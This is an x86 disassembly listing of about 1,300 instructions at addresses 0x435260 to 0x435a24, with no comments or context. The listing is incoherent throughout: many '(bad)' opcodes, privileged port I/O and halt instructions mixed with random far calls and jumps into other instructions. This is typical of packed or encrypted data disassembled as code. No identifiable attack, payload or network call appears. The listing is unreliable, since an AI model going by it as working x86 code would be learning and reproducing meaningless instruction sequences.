  435260:	(bad)  
  435261:	lods   al,BYTE PTR ds:[esi]
  435262:	ret    
  435263:	fnstenv [edx-0x70c5f585]
  435269:	add    DWORD PTR [esi],0xd60b0b89
  43526f:	sub    esp,ebx
  435271:	out    0x5a,eax
  435273:	fnsave [ebx]
  435275:	xchg   BYTE PTR [ebp+0x65d35080],bl
  43527b:	mov    esp,DWORD PTR [edx-0x1d782897]
  435281:	or     ecx,DWORD PTR [ebp-0x794c752d]
  435287:	ds add edx,esp
  43528a:	call   0x4d8d:0xb556bade
  435291:	(bad)  
  435292:	fisub  DWORD PTR [ebp+0x416bb9e6]
  435298:	xchg   BYTE PTR [eax],ah
  43529a:	sbb    al,BYTE PTR ds:0x24bd80e7
  4352a0:	mov    dl,0xc1
  4352a2:	jne    0x435310
  4352a4:	mov    ds:0x8c908d7d,eax
  4352a9:	repz pop eax
  4352ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4352ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4352ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4352ae:	cmc    
  4352af:	pusha  
  4352b0:	adc    ebx,edx
  4352b2:	xchg   edx,eax
  4352b3:	daa    
  4352b4:	mov    ah,0x4a
  4352b6:	pop    es
  4352b7:	cmc    
  4352b8:	scas   al,BYTE PTR es:[edi]
  4352b9:	addr16 out 0xa7,al
  4352bc:	int    0xae
  4352be:	in     eax,dx
  4352bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4352c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4352c1:	cmp    DWORD PTR [edx+edx*4-0x44],esp
  4352c5:	scas   eax,DWORD PTR es:[edi]
  4352c6:	mov    ecx,0x534b556c
  4352cb:	sub    DWORD PTR [edi-0x5674848],edi
  4352d1:	sub    bl,BYTE PTR [edx]
  4352d3:	jmp    0x43527d
  4352d5:	dec    esp
  4352d6:	dec    esi
  4352d7:	cs inc esi
  4352d9:	stos   DWORD PTR es:[edi],eax
  4352da:	test   DWORD PTR [eax+0x275a36c1],esp
  4352e0:	es inc ebx
  4352e2:	jb     0x435326
  4352e4:	or     al,0xb
  4352e6:	inc    eax
  4352e7:	adc    eax,0xe0981870
  4352ec:	add    edi,eax
  4352ee:	call   0x81e1:0xf55e7cc6
  4352f5:	lahf   
  4352f6:	mov    dl,0xa8
  4352f8:	push   ss
  4352f9:	enter  0xb7c,0x66
  4352fd:	mov    ebx,0x73a60a9a
  435302:	das    
  435303:	int    0x98
  435305:	(bad)  
  435306:	popf   
  435307:	adc    BYTE PTR ss:[eax+ecx*1],0x9d
  43530c:	or     BYTE PTR [ecx],0x25
  43530f:	jbe    0x435316
  435311:	or     eax,DWORD PTR [esi-0xe]
  435314:	mov    ds:0x1a92ff29,al
  435319:	mov    al,ds:0x10147d9b
  43531e:	mov    al,0xf1
  435320:	and    bh,BYTE PTR [ebx]
  435322:	jbe    0x435342
  435324:	fisttp QWORD PTR [ebx]
  435326:	aam    0x55
  435328:	out    dx,eax
  435329:	hlt    
  43532a:	(bad)  
  43532b:	dec    BYTE PTR [esi+ebp*1+0x60]
  43532f:	gs mov cl,0xf1
  435332:	(bad)  
  435333:	sub    al,0x36
  435335:	pop    edi
  435336:	inc    eax
  435337:	ja     0x4352de
  435339:	shl    BYTE PTR [edi-0x59],cl
  43533c:	sar    edi,0xd6
  43533f:	fbld   TBYTE PTR [ebp+edi*1-0x1a4df68e]
  435346:	mov    DWORD PTR [ecx-0x60],edx
  435349:	hlt    
  43534a:	repnz hlt 
  43534c:	div    BYTE PTR [ebx+0xe]
  43534f:	shl    ebp,1
  435351:	or     BYTE PTR [edx-0x60],bl
  435354:	mov    dh,BYTE PTR [edx-0x1095fdb0]
  43535a:	stos   DWORD PTR es:[edi],eax
  43535b:	loop   0x43530f
  43535d:	adc    BYTE PTR [ecx+0x2d7f7360],ch
  435363:	fcmovne st,st(1)
  435365:	or     edx,DWORD PTR [ecx+0x3c3021c1]
  43536b:	mov    dh,0xf2
  43536d:	jae    0x435309
  43536f:	sahf   
  435370:	cmp    al,0x39
  435372:	fistp  QWORD PTR [ebx-0xb]
  435375:	xchg   esi,eax
  435376:	dec    ebx
  435377:	push   ecx
  435378:	fmul   QWORD PTR [ebx]
  43537a:	ja     0x4353f1
  43537c:	test   al,0xf6
  43537e:	js     0x43530a
  435380:	inc    edi
  435381:	repz call 0xc963:0xe754e1f2
  435389:	sbb    al,0x6a
  43538b:	mov    al,ds:0xa73c0da
  435390:	or     bh,BYTE PTR [ebx]
  435392:	cs retf 0x3cd2
  435396:	mov    BYTE PTR [ebx],0xe9
  435399:	or     al,ch
  43539b:	popa   
  43539c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43539d:	mov    ds:0x26ca474a,al
  4353a2:	imul   esp,DWORD PTR [edi+0x7571a3d5],0x4e
  4353a9:	mov    WORD PTR [eax-0x586c4aa9],ds
  4353af:	inc    esi
  4353b0:	pop    edi
  4353b1:	cmp    eax,0x2b7a1aaa
  4353b6:	ins    DWORD PTR es:[edi],dx
  4353b7:	dec    edi
  4353b8:	loopne 0x4353ce
  4353ba:	xchg   DWORD PTR [ebp-0x18cfb766],edi
  4353c0:	in     eax,dx
  4353c1:	ficom  WORD PTR [edx]
  4353c3:	fwait
  4353c4:	shr    BYTE PTR [ebp-0x66],1
  4353c7:	jne    0x43543c
  4353c9:	arpl   si,bp
  4353cb:	cmp    DWORD PTR [ebp+0x77a7b63d],edi
  4353d1:	in     eax,0x47
  4353d3:	mov    ds:0x44d6a0c4,eax
  4353d8:	mov    dl,0x8b
  4353da:	sbb    eax,0x8bff3790
  4353df:	ret    0xb5f
  4353e2:	sub    BYTE PTR [edi],bh
  4353e4:	xor    DWORD PTR [esi-0x379e4b82],ebx
  4353ea:	call   0xfbc3:0xd408604f
  4353f1:	(bad)  
  4353f2:	lods   al,BYTE PTR ds:[esi]
  4353f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4353f4:	xchg   ebx,eax
  4353f5:	ficomp WORD PTR ds:0xc42d2feb
  4353fb:	(bad)  
  4353fc:	les    ecx,FWORD PTR [edi]
  4353fe:	call   0x2c2b:0x7b6636e3
  435405:	ins    DWORD PTR es:[edi],dx
  435406:	data16 test al,0x8c
  435409:	pop    esp
  43540a:	out    0xd2,eax
  43540c:	repnz mov dh,0x35
  43540f:	mov    al,0x5f
  435411:	rcr    BYTE PTR [edx-0x7cd2fef9],0xc2
  435418:	pop    eax
  435419:	jne    0x4353fc
  43541b:	mov    ebx,0x673c11bb
  435420:	ret    0xc782
  435423:	add    edx,DWORD PTR [edi-0x6da265d7]
  435429:	adc    ch,ch
  43542b:	jge    0x435421
  43542d:	stc    
  43542e:	pushf  
  43542f:	enter  0x6be0,0x3a
  435433:	and    ebp,DWORD PTR [esp+ecx*1]
  435436:	and    DWORD PTR [edi-0x4e],edi
  435439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43543a:	inc    esi
  43543b:	adc    esi,DWORD PTR ds:0x43c96c35
  435441:	or     ebx,DWORD PTR [ecx-0x39]
  435444:	mov    dh,0x15
  435446:	jbe    0x43549a
  435448:	sahf   
  435449:	sbb    BYTE PTR [edx+0x7c20af48],bl
  43544f:	fadd   DWORD PTR [bp+di]
  435452:	jno    0x4353fb
  435454:	(bad)  
  435455:	out    dx,eax
  435456:	sahf   
  435457:	or     al,0x8a
  435459:	dec    ecx
  43545a:	mov    al,0xf2
  43545c:	mov    dl,0xf7
  43545e:	cli    
  43545f:	push   edi
  435460:	mov    ebx,gs
  435462:	xchg   esi,eax
  435463:	mov    ebp,0x921b0b04
  435468:	les    eax,FWORD PTR [ebp-0x64]
  43546b:	(bad)  
  43546c:	mov    ah,BYTE PTR [esi]
  43546e:	call   0x775c:0xcf37eb5
  435475:	lods   al,BYTE PTR ds:[esi]
  435476:	push   0xe33df9a7
  43547b:	outs   dx,DWORD PTR ds:[esi]
  43547c:	dec    edi
  43547d:	jbe    0x4354a9
  43547f:	and    al,0x41
  435481:	cmp    ebx,DWORD PTR [ecx-0x3b7c4da7]
  435487:	dec    edx
  435488:	mov    ds:0x3608245b,al
  43548d:	or     ecx,ecx
  43548f:	mov    al,0x44
  435491:	sahf   
  435492:	loopne 0x4354d5
  435494:	clc    
  435495:	mov    eax,ds:0x3a7fde95
  43549a:	jmp    0x435483
  43549c:	add    BYTE PTR [edx+0xb891ed3],bl
  4354a2:	push   ss
  4354a3:	pop    esp
  4354a4:	int    0x17
  4354a6:	mov    esi,DWORD PTR [ecx]
  4354a8:	mov    gs,WORD PTR [esi]
  4354aa:	test   BYTE PTR [ebx],al
  4354ac:	ret    0x1a7f
  4354af:	nop
  4354b0:	mov    ebp,0x80e45ad7
  4354b5:	mov    bl,0x8b
  4354b7:	lods   eax,DWORD PTR ds:[esi]
  4354b8:	mov    al,0x2
  4354ba:	mov    ebx,0xa40b3276
  4354bf:	xor    al,0xc9
  4354c1:	fdivr  QWORD PTR [edi+0x62]
  4354c4:	mov    ch,0x11
  4354c6:	popa   
  4354c7:	mov    edx,DWORD PTR ds:0xbd409d55
  4354cd:	jmp    0x435459
  4354cf:	and    ah,BYTE PTR [edx]
  4354d1:	(bad)  
  4354d2:	lahf   
  4354d3:	aas    
  4354d4:	dec    esi
  4354d5:	or     edi,DWORD PTR [ecx]
  4354d7:	mov    BYTE PTR [ecx+0x711660cf],al
  4354dd:	adc    al,0x9a
  4354df:	test   eax,0x9f0bc03d
  4354e4:	scas   eax,DWORD PTR es:[edi]
  4354e5:	loope  0x435510
  4354e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4354e8:	jge    0x43553d
  4354ea:	icebp  
  4354eb:	and    al,0xef
  4354ed:	push   ebp
  4354ee:	pop    edx
  4354ef:	into   
  4354f0:	int3   
  4354f1:	push   ds
  4354f2:	call   0xf3a5:0x491790d5
  4354f9:	fbstp  TBYTE PTR [edx-0x7c4bb59]
  4354ff:	test   BYTE PTR [edi+ebp*8-0x284d36d4],ch
  435506:	mov    ah,0x5
  435508:	sub    DWORD PTR [ecx-0x55],edx
  43550b:	inc    edx
  43550c:	test   al,0xe3
  43550e:	scas   al,BYTE PTR es:[edi]
  43550f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435510:	je     0x435516
  435512:	ret    
  435513:	rcl    dl,1
  435515:	jge    0x4354e5
  435517:	sub    eax,0xa79b1afe
  43551c:	pop    edi
  43551d:	jmp    0xca0c465d
  435522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435524:	iret   
  435525:	mov    al,0xea
  435527:	push   esp
  435528:	cmp    eax,0xb232b4a5
  43552d:	mov    al,ds:0xae116ae9
  435532:	aaa    
  435533:	jle    0x435541
  435535:	or     esp,DWORD PTR [eax+0x3d]
  435538:	sub    dh,0xdc
  43553b:	(bad)  
  43553c:	out    dx,al
  43553d:	cmc    
  43553e:	cmova  edx,DWORD PTR [ebx-0x20]
  435542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435543:	jmp    DWORD PTR [ebp-0x36826cf0]
  435549:	stc    
  43554a:	call   0xb231:0x20c2ba17
  435551:	out    0xbf,al
  435553:	(bad)  
  435554:	jl     0x43556e
  435556:	imul   BYTE PTR [ebp-0x6a00cf4]
  43555c:	repnz out 0x28,eax
  43555f:	test   eax,0x681ae08e
  435564:	push   ebx
  435565:	retf   
  435566:	inc    eax
  435567:	sub    al,0x83
  435569:	xor    ecx,DWORD PTR [edx-0x59]
  43556c:	jo     0x435590
  43556e:	jge    0x435538
  435570:	xlat   BYTE PTR ds:[ebx]
  435571:	pop    edi
  435572:	mov    esp,0x7c4cb3af
  435577:	sbb    dh,BYTE PTR [esi+0x7a60cb62]
  43557d:	sub    DWORD PTR [esi-0x107be359],esp
  435583:	push   0xffffffd0
  435585:	pushf  
  435586:	pop    ebx
  435587:	ret    
  435588:	mov    dl,0x1e
  43558a:	aaa    
  43558b:	(bad)  [eax]
  43558d:	test   DWORD PTR [ebx+0x4c],0xa4620b27
  435594:	stc    
  435595:	and    dl,BYTE PTR ds:0xe294aa61
  43559b:	mov    WORD PTR [eax+0x2b],es
  43559e:	popf   
  43559f:	fwait
  4355a0:	push   es
  4355a1:	xchg   DWORD PTR [eax+0x7f9922be],ecx
  4355a7:	inc    ecx
  4355a8:	out    0x25,al
  4355aa:	jge    0x43561e
  4355ac:	adc    al,0x5
  4355ae:	(bad)  
  4355af:	cdq    
  4355b0:	repnz das 
  4355b2:	xor    BYTE PTR [ebx-0x5e65e5fd],cl
  4355b8:	outs   dx,BYTE PTR ds:[esi]
  4355b9:	repz sbb eax,0x5d9ff181
  4355bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4355c0:	hlt    
  4355c1:	loope  0x435552
  4355c3:	test   esi,ecx
  4355c5:	cld    
  4355c6:	nop
  4355c7:	cmp    eax,0x7de22fb2
  4355cc:	in     al,dx
  4355cd:	pop    ebx
  4355ce:	jne    0x435594
  4355d0:	aad    0x4
  4355d2:	cmc    
  4355d3:	add    ebx,DWORD PTR ds:0xb1785ae3
  4355d9:	sub    BYTE PTR [ecx+0x41],al
  4355dc:	enter  0x9bad,0x5a
  4355e0:	out    dx,eax
  4355e1:	cmp    BYTE PTR [esi+0x3f],0x61
  4355e5:	imul   esi,DWORD PTR [esi+0x77],0xffffffc9
  4355e9:	or     eax,ebx
  4355eb:	and    eax,0x8e0451b8
  4355f0:	fucom  st(7)
  4355f2:	call   0x7bcb:0x6e279dde
  4355f9:	or     BYTE PTR [ecx],dh
  4355fb:	fbld   TBYTE PTR [edi+0xb]
  4355fe:	sub    eax,0x6cb45dea
  435603:	xchg   ecx,eax
  435604:	popa   
  435605:	jecxz  0x43558b
  435607:	jl     0x435675
  435609:	(bad)  
  43560a:	pop    ebp
  43560b:	and    al,0x53
  43560d:	mov    bl,BYTE PTR [edx+0x4e]
  435610:	inc    eax
  435611:	imul   edx,DWORD PTR [ebx+0x1cdb27a4],0xffffff91
  435618:	push   cs
  435619:	inc    ebp
  43561a:	add    al,BYTE PTR [edx-0x71]
  43561d:	imul   esp,DWORD PTR [esi+0x550bbe7b],0xae303e12
  435627:	push   0x58
  435629:	or     edi,ebp
  43562b:	outs   dx,DWORD PTR ds:[esi]
  43562c:	arpl   WORD PTR [esi-0x6b37d059],sp
  435632:	call   0xc63c:0x31cd76f8
  435639:	imul   ebx,DWORD PTR [edi+0x53938ea7],0x0
  435640:	test   eax,0xb20370dc
  435645:	jb     0x435668
  435647:	aaa    
  435648:	js     0x4356b7
  43564a:	cmp    BYTE PTR [esp+edi*4+0xb],dh
  43564e:	push   esi
  43564f:	jmp    0x7c90:0xbb41b31e
  435656:	cdq    
  435657:	add    DWORD PTR [ebx+0x55574d80],esi
  43565d:	hlt    
  43565e:	sub    al,dl
  435660:	xor    DWORD PTR [eax],esp
  435662:	adc    ah,BYTE PTR [edi-0x655bbc85]
  435668:	scas   al,BYTE PTR es:[edi]
  435669:	push   0x20
  43566b:	jmp    0xf163240c
  435670:	mov    bl,0xe0
  435672:	inc    eax
  435673:	sbb    al,BYTE PTR [eax+0x5f]
  435676:	inc    edx
  435677:	push   ebx
  435678:	int3   
  435679:	or     ch,bl
  43567b:	sub    eax,0x697fea72
  435680:	jle    0x435645
  435682:	mov    bl,ah
  435684:	mov    ch,0xbf
  435686:	adc    eax,0x3a933495
  43568b:	mov    ecx,0x4bb90c03
  435690:	call   0x93e8307c
  435695:	(bad)  
  435697:	sar    DWORD PTR [ebx+0x7d],0x32
  43569b:	sbb    al,0x47
  43569d:	out    0x66,al
  43569f:	ret    
  4356a0:	mov    dl,0x55
  4356a2:	or     ecx,DWORD PTR [ecx]
  4356a4:	stos   BYTE PTR es:[edi],al
  4356a5:	pop    edx
  4356a6:	aad    0x54
  4356a8:	xchg   ebx,eax
  4356a9:	or     eax,DWORD PTR [ebp-0x10]
  4356ac:	dec    eax
  4356ad:	aas    
  4356ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4356af:	popa   
  4356b0:	hlt    
  4356b1:	lock call 0x4355:0x85eac3a4
  4356b9:	fcom   st(5)
  4356bb:	mov    al,ds:0xcbbc9d3f
  4356c0:	(bad)  
  4356c1:	jne    0x43571d
  4356c3:	fadd   QWORD PTR [edx-0x42a3c99a]
  4356c9:	cdq    
  4356ca:	push   ebx
  4356cb:	xchg   ebx,eax
  4356cc:	adc    eax,0x9af06a89
  4356d1:	pop    ebp
  4356d2:	inc    ecx
  4356d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4356d4:	pop    es
  4356d5:	dec    eax
  4356d6:	(bad)  
  4356d7:	repz ror BYTE PTR [ecx-0x68712e60],cl
  4356de:	cld    
  4356df:	int3   
  4356e0:	mov    dl,0x76
  4356e2:	xor    ch,ch
  4356e4:	or     ebx,esi
  4356e6:	stc    
  4356e7:	pop    ecx
  4356e8:	(bad)  
  4356e9:	or     ecx,DWORD PTR [edx+0x13d72f2d]
  4356ef:	pop    ss
  4356f0:	xlat   BYTE PTR ds:[ebx]
  4356f1:	cmp    DWORD PTR [esi-0x25269dfa],eax
  4356f7:	xor    dh,bl
  4356f9:	in     al,0xfd
  4356fb:	ins    BYTE PTR es:[edi],dx
  4356fc:	mov    ah,0xb
  4356fe:	(bad)  
  435700:	sub    eax,0xd6892526
  435705:	push   0xffffff9a
  435707:	or     DWORD PTR [esi+0x59],eax
  43570a:	call   0xe1cb8d63
  43570f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435710:	mov    ds:0xd77ed660,al
  435715:	and    al,BYTE PTR [ebp+0x3e9db239]
  43571b:	jecxz  0x435703
  43571d:	addr16 push cs
  43571f:	std    
  435720:	add    BYTE PTR [ebx],cl
  435722:	(bad)  
  435723:	hlt    
  435724:	shr    BYTE PTR [ebx-0x4433f0cb],1
  43572a:	call   0x1f2c:0x6089f32e
  435731:	inc    edi
  435732:	(bad)  
  435733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435734:	enter  0xc151,0xd3
  435738:	in     eax,dx
  435739:	xchg   edi,eax
  43573a:	cwde   
  43573b:	mov    ecx,0x67f749b1
  435740:	rcl    BYTE PTR [ecx-0x3c73c3bf],cl
  435746:	das    
  435747:	sti    
  435748:	mov    ds:0x117eba0b,al
  43574d:	sub    BYTE PTR [ebx+0x50],bl
  435750:	mov    ecx,0xffbb9a6a
  435755:	dec    edx
  435756:	fwait
  435757:	js     0x435755
  435759:	cmp    al,0x8e
  43575b:	push   ebp
  43575c:	jns    0x435751
  43575e:	aad    0xa6
  435760:	jnp    0x4356f7
  435762:	add    ah,dh
  435764:	sbb    DWORD PTR es:[eax],edx
  435767:	imul   eax,DWORD PTR [eax+0x51],0xffffff86
  43576b:	and    ecx,esp
  43576d:	dec    edi
  43576e:	add    al,0x14
  435770:	jb     0x435783
  435772:	mov    ah,0xee
  435774:	mov    bh,0xd8
  435776:	cmp    BYTE PTR [ebx-0x3c8f3184],ah
  43577c:	dec    BYTE PTR [ebx+0x1922dc0e]
  435782:	call   0x6810:0xccab87a6
  435789:	sti    
  43578a:	fisub  WORD PTR [edi-0x1ded7703]
  435790:	loope  0x43578e
  435792:	sbb    edx,0xffffffcd
  435795:	fistp  WORD PTR [edx-0x3aa81096]
  43579b:	push   esi
  43579c:	lahf   
  43579d:	popa   
  43579e:	mov    esp,DWORD PTR [edi+0x4b5d01ea]
  4357a4:	sub    al,0x1b
  4357a6:	pop    ss
  4357a7:	popa   
  4357a8:	mov    dl,0x64
  4357aa:	xor    DWORD PTR [ebp-0x6a06739d],ecx
  4357b0:	sub    dl,BYTE PTR [ebx+ecx*4]
  4357b3:	adc    BYTE PTR ds:0x9a75d6cc,0xb
  4357ba:	(bad)  
  4357bb:	lods   eax,DWORD PTR ds:[esi]
  4357bc:	jb     0x435821
  4357be:	call   0xcb31:0xce7314ec
  4357c5:	cwde   
  4357c6:	outs   dx,DWORD PTR ds:[esi]
  4357c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4357c8:	jp     0x43577a
  4357ca:	repz sub ch,BYTE PTR [ecx+0x3c]
  4357ce:	pop    eax
  4357cf:	repnz mov al,0xf5
  4357d2:	aaa    
  4357d3:	in     al,0x58
  4357d5:	das    
  4357d6:	mov    ds:0xce6bf3c5,eax
  4357db:	pop    esi
  4357dc:	add    BYTE PTR [ebx],cl
  4357de:	pop    es
  4357df:	int3   
  4357e0:	pop    esi
  4357e1:	addr16 dec esp
  4357e3:	mov    ah,0xbe
  4357e5:	add    eax,0x1c16789b
  4357ea:	pop    esp
  4357eb:	cmp    eax,0x854606f9
  4357f0:	imul   ecx,DWORD PTR [ebx],0xffffff8c
  4357f3:	cmp    DWORD PTR [eax+0x78d36420],0xa15f6a62
  4357fd:	cmp    DWORD PTR [edi-0x62],edx
  435800:	dec    eax
  435801:	or     esp,DWORD PTR [edi]
  435803:	rcl    dl,0xd4
  435806:	shl    BYTE PTR [ebx-0x4f],0xd2
  43580a:	push   eax
  43580b:	in     eax,dx
  43580c:	add    eax,0x7f2f9f8b
  435811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435812:	pop    ds
  435813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435814:	(bad)
  435817:	mov    esi,0xd202983d
  43581c:	inc    ebx
  43581d:	adc    al,0x9a
  43581f:	jb     0x4357c9
  435821:	and    al,0xd9
  435823:	inc    esp
  435824:	inc    eax
  435825:	lea    edx,[edi+eiz*4-0x17]
  435829:	adc    al,dl
  43582b:	add    eax,0xebe2ffde
  435830:	mov    dl,0xdd
  435832:	mov    cl,0xfd
  435834:	stos   DWORD PTR es:[edi],eax
  435835:	xor    DWORD PTR [ebp-0x2bf40e3f],ebp
  43583b:	xor    eax,0x6570aef9
  435840:	imul   esi,DWORD PTR [eax],0xffffff9a
  435843:	fcomp  st(7)
  435845:	arpl   WORD PTR [eax+0x19],ax
  435848:	iret   
  435849:	and    BYTE PTR [eax-0x60],cl
  43584c:	shr    esi,cl
  43584e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43584f:	adc    al,0x7a
  435851:	or     ebp,DWORD PTR [edi]
  435853:	dec    eax
  435854:	or     ebp,DWORD PTR [edi-0x6b]
  435857:	pop    edi
  435858:	retf   0x8368
  43585b:	addr16 out 0x3e,al
  43585e:	ret    0x22f4
  435861:	or     ecx,edi
  435863:	pop    ebp
  435864:	and    eax,0xf99bde08
  435869:	push   esi
  43586a:	call   0xa574:0x4a79cee1
  435871:	ret    0xa734
  435874:	test   BYTE PTR [esi],ch
  435876:	mov    ah,0x35
  435878:	adc    ecx,DWORD PTR [esi+0x14]
  43587b:	inc    edi
  43587c:	mov    dl,0x2
  43587e:	imul   edx,DWORD PTR [ecx+ecx*1+0xd],0x3e
  435883:	pushf  
  435884:	call   0xcfecd895
  435889:	or     al,bl
  43588b:	inc    esi
  43588c:	mov    bh,0xd2
  43588e:	ret    0xbf53
  435891:	dec    eax
  435892:	call   0xcaad:0x7065ddf4
  435899:	mov    edx,0xc1e6f749
  43589e:	mov    edx,0x270b4adb
  4358a3:	dec    ecx
  4358a4:	fld    TBYTE PTR [edi+0x76]
  4358a7:	cld    
  4358a8:	imul   ebx,DWORD PTR [eax+ebx*4-0x47],0xad713f79
  4358b0:	dec    ebp
  4358b1:	dec    ebx
  4358b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4358b3:	cs (bad) 
  4358b6:	or     al,0x86
  4358b8:	mov    dl,0x6c
  4358ba:	inc    edx
  4358bb:	mov    eax,ds:0x5076655b
  4358c0:	lea    esp,[esi-0xead5806]
  4358c6:	ja     0x4358f5
  4358c8:	sti    
  4358c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4358ca:	fstp   st(6)
  4358cc:	xlat   BYTE PTR ds:[ebx]
  4358cd:	or     esp,DWORD PTR [eax]
  4358cf:	add    cl,BYTE PTR [esi+0x52]
  4358d2:	xchg   edi,eax
  4358d3:	mov    cl,0xfd
  4358d5:	ret    
  4358d6:	lahf   
  4358d7:	sub    DWORD PTR [esi-0x4da16d44],esp
  4358dd:	aad    0x30
  4358df:	or     al,BYTE PTR [ecx]
  4358e1:	cmp    DWORD PTR [ecx-0x59],ebp
  4358e4:	scas   al,BYTE PTR es:[edi]
  4358e5:	and    BYTE PTR [ebx-0x58],ch
  4358e8:	clc    
  4358e9:	ficomp DWORD PTR [esi-0x7c354d73]
  4358ef:	aaa    
  4358f0:	inc    esp
  4358f1:	inc    esp
  4358f2:	push   edi
  4358f3:	pop    edi
  4358f4:	fwait
  4358f5:	mov    ebx,0xb5ad12e
  4358fa:	push   edx
  4358fb:	inc    ecx
  4358fc:	lea    ebx,[ebp*8-0x6593f8ac]
  435903:	hlt    
  435904:	mov    al,ds:0x5d18299e
  435909:	jmp    0x435939
  43590b:	aam    0x40
  43590d:	or     ah,cl
  43590f:	addr16 push ebp
  435911:	xor    BYTE PTR [ebp+0x2ae41ee6],dh
  435917:	mov    esp,0xf4991bb9
  43591c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43591d:	shl    BYTE PTR ds:0x2c0b70e5,cl
  435923:	les    ebx,FWORD PTR [edx]
  435925:	rcr    BYTE PTR ss:[ecx+eiz*1],1
  435929:	test   BYTE PTR [edx],0xdd
  43592c:	mov    dl,0xe4
  43592e:	shl    BYTE PTR [edx],cl
  435930:	(bad)  
  435931:	fcomp  st(6)
  435933:	sbb    eax,DWORD PTR [edi+0xb]
  435936:	jle    0x43590d
  435938:	jmp    0x74ce:0xd0020e9e
  43593f:	mov    DWORD PTR [edx-0x551a369f],esi
  435945:	mov    eax,ds:0x3035077f
  43594a:	test   ecx,esp
  43594c:	scas   eax,DWORD PTR es:[edi]
  43594d:	xor    eax,0x1eb32404
  435952:	push   cs
  435953:	xlat   BYTE PTR ds:[ebx]
  435954:	dec    edx
  435955:	pop    ebx
  435956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435957:	fldenv [edx+eiz*8-0x624eba01]
  43595e:	push   esp
  43595f:	cmc    
  435960:	and    dl,bl
  435962:	sti    
  435963:	pop    ss
  435964:	cwde   
  435965:	or     ebx,DWORD PTR [ebx]
  435967:	imul   esp,DWORD PTR [ebx+edi*2+0x31],0xffffffe9
  43596c:	fidiv  WORD PTR [ebx-0x66]
  43596f:	sbb    esi,DWORD PTR [ebx+esi*1-0x4504be78]
  435976:	(bad)  
  435977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435978:	add    eax,0xb05ef841
  43597d:	xchg   DWORD PTR [ebx+0x23],eax
  435980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435981:	inc    ebx
  435982:	inc    esi
  435983:	xchg   ebp,eax
  435984:	mov    dl,0x25
  435986:	stc    
  435987:	cmp    al,0x4a
  435989:	add    BYTE PTR [ebp+0x55],0x7e
  43598d:	cmp    edx,DWORD PTR [edi]
  43598f:	xchg   edx,eax
  435990:	ss std 
  435992:	sti    
  435993:	xchg   edi,eax
  435994:	mov    dl,0xdc
  435996:	test   ch,al
  435998:	pop    eax
  435999:	jecxz  0x4359db
  43599b:	scas   al,BYTE PTR es:[edi]
  43599c:	dec    ebx
  43599d:	add    al,0x2a
  43599f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4359a0:	mov    dl,BYTE PTR [edi]
  4359a2:	mov    edx,0x3614c4fe
  4359a7:	ret    
  4359a8:	mov    ah,0x3d
  4359aa:	push   0x940fea9d
  4359af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359b0:	adc    eax,0xf6a2d80c
  4359b5:	push   ss
  4359b6:	iret   
  4359b7:	dec    esi
  4359b8:	mov    dl,0x36
  4359ba:	add    DWORD PTR [esi+esi*2-0x53],edi
  4359be:	pop    eax
  4359bf:	scas   eax,DWORD PTR es:[edi]
  4359c0:	pop    ebp
  4359c1:	or     esp,DWORD PTR [edi]
  4359c3:	iret   
  4359c4:	ret    
  4359c5:	test   BYTE PTR [edi],cl
  4359c7:	pop    es
  4359c8:	test   al,0x37
  4359ca:	xchg   ecx,eax
  4359cb:	imul   esp,DWORD PTR [edx-0x9593d1b],0x1c
  4359d2:	pop    eax
  4359d3:	stos   BYTE PTR es:[edi],al
  4359d4:	jb     0x4359dd
  4359d6:	out    0xa7,al
  4359d8:	rcr    BYTE PTR [ecx-0x33afee33],cl
  4359de:	aad    0x4e
  4359e0:	leave  
  4359e1:	pushf  
  4359e2:	popf   
  4359e3:	out    0xb8,al
  4359e5:	fimul  WORD PTR [esi+0x36]
  4359e8:	jb     0x435a61
  4359ea:	leave  
  4359eb:	mov    BYTE PTR [eax+0x31],bl
  4359ee:	xchg   ebp,eax
  4359ef:	mov    cl,0xb3
  4359f1:	mov    ch,al
  4359f3:	retf   
  4359f4:	rcr    eax,1
  4359f6:	ins    BYTE PTR es:[edi],dx
  4359f7:	inc    ebx
  4359f8:	jo     0x43598d
  4359fa:	call   0x7911:0xe7037efc
  435a01:	fild   WORD PTR [ecx+0x790774a7]
  435a07:	adc    al,0x6a
  435a09:	xacquire xchg DWORD PTR [ecx-0x1ac74c4e],esp
  435a10:	shl    BYTE PTR [eax-0x36],cl
  435a13:	repz mov al,ds:0x5d6d990c
  435a19:	xor    BYTE PTR [ebx],bl
  435a1b:	pop    es
  435a1c:	sub    WORD PTR [ebx],bp
  435a1f:	and    eax,0x87039fb2
  435a24:	outs   dx,BYTE PTR ds:[esi]
